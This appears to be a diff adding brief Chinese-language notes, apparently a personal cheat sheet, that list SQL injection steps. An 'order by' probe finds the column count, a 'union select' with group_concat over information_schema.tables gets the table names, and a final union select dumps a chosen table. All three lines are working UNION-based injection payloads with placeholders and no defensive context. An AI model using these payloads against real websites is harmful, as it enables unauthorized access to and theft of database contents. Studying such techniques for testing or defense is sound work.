@@ -1,0 +1,3 @@
+1.order by ｛列数｝，根据返回信息，若正确，则数字≤列数，若错误则≥列数
+2.union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()，获取表名
+3.union select 1,｛表名｝,3,4 from ｛表名｝
